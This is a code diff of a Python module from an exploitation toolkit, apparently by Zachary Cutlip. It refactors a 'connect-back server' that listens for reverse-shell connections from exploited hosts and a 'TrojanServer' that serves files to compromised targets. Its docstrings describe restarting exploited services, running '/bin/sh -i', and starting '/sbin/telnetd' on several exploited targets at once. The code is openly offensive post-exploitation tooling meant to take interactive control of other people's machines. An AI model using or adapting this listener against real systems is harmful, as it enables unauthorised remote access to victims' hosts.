@@ -1,21 +1,3 @@
-#Copyright (C) 2013  Zachary Cutlip [uid000_at_gmail_dot_com]
-#
-#This program is free software; you can redistribute it and/or
-#modify it under the terms of the GNU General Public License
-#as published by the Free Software Foundation; either version 2
-#of the License, or (at your option) any later version.
-#
-#This program is distributed in the hope that it will be useful,
-#but WITHOUT ANY WARRANTY; without even the implied warranty of
-#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-#GNU General Public License for more details.
-#
-#You should have received a copy of the GNU General Public License
-#along with this program; if not, write to the Free Software
-#Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
-
-
-
 import signal
 import socket
 import sys
@@ -23,11 +5,40 @@ import os
 import select
 import traceback
 
-class Callback(object):
+class ConnectbackServer(object):
+    """
+    A connect-back server class.
+    
+    This class provides a server that waits for an incoming connection from a
+    connect-back payload and provides an interactive shell.  Think "netcat
+    listener" that has an API and can be used programmatically.
+    """
     MAX_READ=1024
-    def __init__(self,callback_ip,port=8080,startcmd=None,connectback_shell=True):
-        self.callback_ip=callback_ip
-        self.port=port
+    def __init__(self,connectback_host,startcmd=None,connectback_shell=True):
+        """
+        Class constructor.
+        
+        Parameters
+        ----------
+        callback_ip: the address this server should bind to.
+        port: Optional. The port this server should bind to.  Default value is
+            8080.
+        startcmd: Optional.  A command string to issue to the remote host upon
+            connecting.  This could be a command to restart the exploited
+            service, or to customize the interactive shell, e.g., '/bin/sh -i'.
+        connectback_shell: Optional.  This argument defaults to True, which is
+            99% of the time is what you need.  See note.
+        
+        Note
+        ----
+        If, say, you wanted to non-interactively exploit a target (or multiple
+        targets) and automatically kick off a telnet sever on each one, then,
+        for each exploited target, you could construct a ConnectbackServer like
+        so:
+            server=ConnectbackServer(connectback_host,startcmd='/sbin/telnetd',connectback_shell=False)
+        """
+        self.callback_ip=connectback_host.callback_ip
+        self.port=connectback_host.port
         self.startcmd=startcmd
         self.connectback_shell=connectback_shell
 
@@ -35,18 +46,20 @@ class Callback(object):
         print >>sys.stderr,"signal num %d\n"%signum
         self.keepgoing=False
 
-    def server(self,port):
+    def server(self):
         serversocket = socket.socket(
                 socket.AF_INET,socket.SOCK_STREAM)
         serversocket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
 
-        serversocket.bind(("0.0.0.0",int(port)))
+        serversocket.bind((self.callback_ip,int(self.port)))
         serversocket.listen(5)
         return serversocket
+        
+    def exit(self):
+        #this prevents a hang in mod_wsgi, which traps sys.exit()
+        os.execv("/bin/true",["/bin/true"])
 
-
-    def serve_callback_shell(self):
-
+    def __serve_connectback_shell(self):
         max_read=self.__class__.MAX_READ
         signal.signal(signal.SIGINT,self.handler)
         signal.signal(signal.SIGTERM,self.handler)
@@ -97,22 +110,24 @@ class Callback(object):
                 server_socket.close()
 
         print >>sys.stderr,"Exiting\n"
-        sys.exit()
+        self.exit()
         
 
-    def serve_callback(self):
-        pid=None
+    def serve_connectback(self):
         if self.connectback_shell:
             pid=os.fork()
             if pid and pid > 0:
                 return pid
             else:
-                self.serve_callback_shell()
+                #no return
+                self.__serve_connectback_shell()
+        else:
+            return None
    
 
-class TrojanCallback(Callback):
-    def __init__(self,callback_ip,files_to_serve,port=8080,connectback_shell=False):
-        super(self.__class__,self).__init__(callback_ip,port=8080)
+class TrojanServer(ConnectbackServer):
+    def __init__(self,connectback_host,files_to_serve,connectback_shell=False):
+        super(self.__class__,self).__init__(connectback_host)
         self.files_to_serve=files_to_serve
         self.connectback_shell=connectback_shell
     
@@ -124,8 +139,7 @@ class TrojanCallback(Callback):
         
         clientsocket.shutdown(socket.SHUT_RDWR)
         clientsocket.close()
-    def exit(self):
-        os.execv("/bin/true",["/bin/true"])
+    
 
     def serve_callback(self):
         pid=os.fork()
@@ -143,8 +157,9 @@ class TrojanCallback(Callback):
         
         if self.connectback_shell == True:
             print "Serving callback_shell."
-            self.serve_callback_shell()
-        self.exit()
+            #no return
+            self.__serve_connectback_shell()
+
             
 
 
